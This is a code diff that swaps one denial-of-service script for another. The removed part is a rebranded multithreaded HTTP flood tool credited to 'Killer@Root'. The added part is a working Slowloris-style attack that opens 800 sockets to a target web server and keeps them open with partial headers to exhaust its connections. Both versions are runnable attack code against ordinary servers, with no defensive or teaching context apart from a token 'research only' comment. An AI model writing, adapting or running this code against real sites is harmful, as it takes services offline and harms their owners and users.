@@ -1,159 +1,57 @@
-# www.youtube.com/channel/UCUSGZYGyFtzry2Ich7p0Wjw
-# Killer@Root
-# Killer@Root
+import socket, random, time, sys
 
-# ----------------------------------------------------------------------------------------------
-# root - HTTP Unbearable Load King
-#
-# this tool is a dos tool that is meant to put heavy load on HTTP servers in order to bring them
-# to their knees by exhausting the resource pool, its is meant for research purposes only
-# and any malicious usage of this tool is prohibited.
-#
-# author :  Barry Shteiman , version 1.0
-# ----------------------------------------------------------------------------------------------
-import urllib2
-import sys
-import threading
-import random
-import re
+headers = [
+    "User-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
+    "Accept-language: en-US,en"
+]
 
-#global params
-url=''
-host=''
-headers_useragents=[]
-headers_referers=[]
-request_counter=0
-flag=0
-safe=0
+sockets = []
 
-def inc_counter():
-	global request_counter
-	request_counter+=1
+def setupSocket(ip):
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.settimeout(4)
+    sock.connect((ip, 80))
+    sock.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 1337)).encode("utf-8"))
 
-def set_flag(val):
-	global flag
-	flag=val
+    for header in headers:
+        sock.send("{}\r\n".format(header).encode("utf-8"))
 
-def set_safe():
-	global safe
-	safe=1
-	
-# generates a user agent array
-def useragent_list():
-	global headers_useragents
-	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
-	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
-	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
-	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
-	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
-	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
-	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
-	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
-	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
-	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
-	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
-	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
-	return(headers_useragents)
+    return sock
 
-# generates a referer array
-def referer_list():
-	global headers_referers
-	headers_referers.append('http://www.google.com/?q=')
-	headers_referers.append('http://www.usatoday.com/search/results?q=')
-	headers_referers.append('http://engadget.search.aol.com/search?q=')
-	headers_referers.append('http://' + host + '/')
-	return(headers_referers)
-	
-#builds random ascii string
-def buildblock(size):
-	out_str = ''
-	for i in range(0, size):
-		a = random.randint(65, 90)
-		out_str += chr(a)
-	return(out_str)
+if __name__ == "__main__":
+    if len(sys.argv) != 2:
+        print("Use it like this: python {} example.com".format(sys.argv[0]))
+        sys.exit()
 
-def usage():
-	print '---------------------------------------------------'
-	print 'USAGE: python root.py <url>'
-	print 'you can add "safe" after url, to autoshut after dos'
-	print '---------------------------------------------------'
+    ip = sys.argv[1]
+    count = 800
+    print("Starting DoS attack on {}. Connecting to {} sockets.".format(ip, count))
 
-	
-#http request
-def httpcall(url):
-	useragent_list()
-	referer_list()
-	code=0
-	if url.count("?")>0:
-		param_joiner="&"
-	else:
-		param_joiner="?"
-	request = urllib2.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
-	request.add_header('User-Agent', random.choice(headers_useragents))
-	request.add_header('Cache-Control', 'no-cache')
-	request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
-	request.add_header('Referer', random.choice(headers_referers) + buildblock(random.randint(5,10)))
-	request.add_header('Keep-Alive', random.randint(110,120))
-	request.add_header('Connection', 'keep-alive')
-	request.add_header('Host',host)
-	try:
-			urllib2.urlopen(request)
-	except urllib2.HTTPError, e:
-			#print e.code
-			set_flag(1)
-			print 'Ataque Iniciado 65000 Bytes By Killer@Root'
-			code=500
-	except urllib2.URLError, e:
-			#print e.reason
-			sys.exit()
-	else:
-			inc_counter()
-			urllib2.urlopen(request)
-	return(code)		
+    for _ in range(count):
+        try:
+            print("Socket {}".format(_))
+            sock = setupSocket(ip)
+        except socket.error:
+            break
 
-	
-#http caller thread 
-class HTTPThread(threading.Thread):
-	def run(self):
-		try:
-			while flag<2:
-				code=httpcall(url)
-				if (code==500) & (safe==1):
-					set_flag(2)
-		except Exception, ex:
-			pass
+        sockets.append(sock)
 
-# monitors http threads and counts requests
-class MonitorThread(threading.Thread):
-	def run(self):
-		previous=request_counter
-		while flag==0:
-			if (previous+100<request_counter) & (previous<>request_counter):
-				print "%d Requests Sent" % (request_counter)
-				previous=request_counter
-		if flag==2:
-			print "\n-- Root Attack Finished --"
+    while True:
+        print("Connected to {} sockets. Sending headers...".format(len(sockets)))
 
-#execute 
-if len(sys.argv) < 2:
-	usage()
-	sys.exit()
-else:
-	if sys.argv[1]=="help":
-		usage()
-		sys.exit()
-	else:
-		print "-- Root Attack Started By Killer@Root --"
-		if len(sys.argv)== 3:
-			if sys.argv[2]=="safe":
-				set_safe()
-		url = sys.argv[1]
-		if url.count("/")==2:
-			url = url + "/"
-		m = re.search('http\://([^/]*)/?.*', url)
-		host = m.group(1)
-		for i in range(500):
-			t = HTTPThread()
-			t.start()
-		t = MonitorThread()
-		t.start()
+        for sock in list(sockets):
+            try:
+                sock.send("X-a: {}\r\n".format(random.randint(1, 4600)).encode("utf-8"))
+            except socket.error:
+                sockets.remove(sock)
+
+        for _ in range(count - len(sockets)):
+            print("Re-opening closed sockets...")
+            try:
+                sock = setupSocket(ip)
+                if sock:
+                    sockets.append(sock)
+            except socket.error:
+                break
+
+        time.sleep(15)
